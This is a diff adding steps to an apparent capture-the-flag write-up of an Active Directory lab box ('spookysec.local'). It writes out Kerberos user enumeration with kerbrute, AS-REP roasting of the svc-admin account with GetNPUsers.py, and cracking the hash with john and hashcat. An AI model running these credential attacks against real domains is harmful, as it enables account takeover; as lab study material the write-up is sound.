@@ -26,3 +26,15 @@ Since the port for kerberos was opened we were able to use kerbrute for user enu
 ```
 ./kerbrute userenum --dc 10.10.62.43 -d spookysec.local userlist.txt
 ```
+We then used the command: 
+```
+python3 GetNPUsers.py spookysec.local/svc-admin -no-pass -dc-ip 10.10.62.43
+```
+On the svc-admin user to get a hash. We then decrypted the hash with john ro get the password for the user.
+```
+john admin.hash --wordlist=/home/blackzero/rockyou.txt 
+```
+we also used hashcat:
+```
+hashcat -m 18200 admin.hash passwordlist.txt
+```
